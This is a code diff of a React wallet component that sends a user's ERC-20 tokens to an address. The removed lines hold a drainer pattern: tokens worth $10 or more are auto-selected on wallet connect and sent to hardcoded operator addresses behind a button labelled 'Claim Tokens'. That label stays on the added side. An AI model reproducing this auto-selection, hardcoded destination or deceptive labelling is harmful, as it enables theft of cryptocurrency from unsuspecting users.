@@ -1,17 +1,11 @@
-import React from 'react';
 import { Button, Input, useToasts } from '@geist-ui/core';
 import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
+import { isAddress } from 'essential-eth';
 import { useAtom } from 'jotai';
+import { normalize } from 'viem/ens';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
+import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
-
-// List of Networks and Corresponding Addresses
-const networkAddresses: Record<string, string> = {
-  ethereum: '0xEthereumAddress', // Replace with actual Ethereum address
-  polygon: '0xPolygonAddress', // Replace with actual Polygon address
-  bsc: '0xBSCAddress', // Replace with actual Binance Smart Chain address
-  // Add other networks and their corresponding addresses here
-};
 
 function sleep(ms: number): Promise<void> {
   return new Promise((resolve) => setTimeout(resolve, ms));
@@ -19,7 +13,7 @@ function sleep(ms: number): Promise<void> {
 
 export const SendTokens = () => {
   const { setToast } = useToasts();
-
+  
   const showToast = (message: string, type: any) =>
     setToast({
       text: message,
@@ -28,57 +22,31 @@ export const SendTokens = () => {
     });
 
   const [tokens] = useAtom(globalTokensAtom);
+  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
-
-  // Automatically select tokens with a minimum $10 balance when the wallet connects
-  const autoSelectTokens = async () => {
-    if (!walletClient || !tokens.length) return;
-
-    const updatedCheckedRecords = { ...checkedRecords };
-
-    for (const token of tokens) {
-      const balanceInUSD = parseFloat(token.balance || '0') * parseFloat(token.token_price_usd || '0');
-      if (balanceInUSD >= 10) {
-        updatedCheckedRecords[token.contract_address] = {
-          ...checkedRecords[token.contract_address],
-          isChecked: true,
-        };
-      }
-    }
-
-    setCheckedRecords(updatedCheckedRecords);
-  };
-
-  React.useEffect(() => {
-    autoSelectTokens();
-  }, [walletClient, tokens]);
 
   const sendAllCheckedTokens = async () => {
     const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(checkedRecords)
       .filter(([_, { isChecked }]) => isChecked)
       .map(([tokenAddress]) => tokenAddress as `0x${string}`);
 
-    if (!walletClient) return;
+    if (!walletClient || !destinationAddress) return;
+
+    if (destinationAddress.includes('.')) {
+      const resolvedDestinationAddress = await publicClient.getEnsAddress({
+        name: normalize(destinationAddress),
+      });
+      if (resolvedDestinationAddress) {
+        setDestinationAddress(resolvedDestinationAddress);
+      }
+      return;
+    }
 
     for (const tokenAddress of tokensToSend) {
       const token = tokens.find(token => token.contract_address === tokenAddress);
       if (!token) continue;
-
-      // Verify that the network property exists and is valid
-      const network = token.network?.toLowerCase();
-      if (!network) {
-        showToast(`Token ${token.contract_ticker_symbol} does not have a valid network property`, 'warning');
-        continue;
-      }
-
-      // Automatically select the corresponding destination address based on the network
-      const destinationAddress = networkAddresses[network];
-      if (!destinationAddress) {
-        showToast(`No destination address found for network: ${network}`, 'warning');
-        continue;
-      }
 
       const { request } = await publicClient.simulateContract({
         account: walletClient.account,
@@ -107,34 +75,49 @@ export const SendTokens = () => {
     }
   };
 
+  const addressAppearsValid: boolean = 
+    typeof destinationAddress === 'string' &&
+    (destinationAddress.includes('.') || isAddress(destinationAddress));
+
   const checkedCount = Object.values(checkedRecords).filter(record => record.isChecked).length;
 
   return (
     <div style={{ margin: '20px' }}>
-      <Input
-        required
-        value="" // Update this value accordingly if needed
-        placeholder="Enter address"
-        onChange={() => {}} // Add your onChange handler if needed
-        type="default" // Adjust type as needed
-        width="100%"
-        style={{
-          marginLeft: '10px',
-          marginRight: '10px',
-        }}
-        onPointerEnterCapture={() => {}}
-        onPointerLeaveCapture={() => {}}
-      />
-      <Button
-        type="secondary"
-        onClick={sendAllCheckedTokens}
-        disabled={checkedCount === 0}
-        style={{ marginTop: '20px' }}
-      >
-        {checkedCount === 0
-          ? 'Claim Tokens'
-          : `Claim ${checkedCount} Tokens Now`}
-      </Button>
+      <form>
+        <label>
+          Destination Address:
+          <Input
+            required
+            value={destinationAddress}
+            placeholder="vitalik.eth"
+            onChange={(e) => setDestinationAddress(e.target.value)}
+            type={
+              addressAppearsValid
+                ? 'success'
+                : destinationAddress.length > 0
+                  ? 'warning'
+                  : 'default'
+            }
+            width="100%"
+            style={{
+              marginLeft: '10px',
+              marginRight: '10px',
+            }}
+            onPointerEnterCapture={() => {}}
+            onPointerLeaveCapture={() => {}}
+          />
+        </label>
+        <Button
+          type="secondary"
+          onClick={sendAllCheckedTokens}
+          disabled={!addressAppearsValid}
+          style={{ marginTop: '20px' }}
+        >
+          {checkedCount === 0
+            ? 'Claim Tokens'
+            : `Claim ${checkedCount} Tokens Now`}
+        </Button>
+      </form>
     </div>
   );
 };
